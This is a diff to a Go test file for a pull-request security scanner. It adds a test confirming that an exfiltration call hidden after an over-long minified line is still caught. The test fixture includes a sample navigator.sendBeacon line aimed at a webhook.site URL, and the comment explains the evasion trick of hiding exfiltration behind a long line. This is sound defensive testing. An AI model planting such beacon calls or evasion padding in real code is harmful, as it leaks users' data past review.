@@ -2,6 +2,7 @@ package prdefense_test
 
 import (
 	"context"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -93,6 +94,36 @@ func TestScan_BlocksOnMaliciousChangelist(t *testing.T) {
 	assert.Equal(t, prdefense.SkipRemoved, reasons["gone.go"])
 	assert.Equal(t, prdefense.SkipBinary, reasons["logo.bin"])
 	assert.Equal(t, prdefense.SkipTooLarge, reasons["huge.txt"])
+}
+
+// TestScan_LongLineDoesNotHideExfilHit pins the gate-level behavior behind
+// the exfilwatch long-line fix: a minified-style file whose first line
+// exceeds the 1 MiB scanner cap, with the exfil literal on the next line.
+// Before the line-reader fix the scanner halted at the over-long line and
+// saw nothing after it, silently downgrading the gate from BLOCK to CLEAR —
+// an attacker could hide exfiltration behind a long bundle line. The filler
+// is space-separated so it does not itself trip the content-injection
+// encoded-blob primitive, isolating the exfil path as the sole block reason.
+func TestScan_LongLineDoesNotHideExfilHit(t *testing.T) {
+	t.Parallel()
+
+	var b strings.Builder
+	b.WriteString(strings.Repeat("x ", 600*1024)) // ~1.2 MiB, no 256-char run
+	b.WriteByte('\n')
+	b.WriteString("navigator.sendBeacon('https://webhook.site/deadbeef')\n")
+
+	src := fakeProvider{content: map[string][]byte{
+		"web/bundle.js": []byte(b.String()),
+	}}
+	changed := []prdefense.ChangedFile{{Path: "web/bundle.js", Status: "added"}}
+
+	rep, err := prdefense.Scan(context.Background(), src, "sha", changed)
+	require.NoError(t, err)
+
+	require.Len(t, rep.ExfilHits, 1, "exfil literal after the over-long line must be found")
+	assert.Equal(t, "webhook.site", rep.ExfilHits[0].Host)
+	assert.Equal(t, "web/bundle.js", rep.ExfilHits[0].File)
+	assert.Equal(t, prdefense.VerdictBlock, rep.Verdict)
 }
 
 func TestScan_ClearOnBenignChangelist(t *testing.T) {
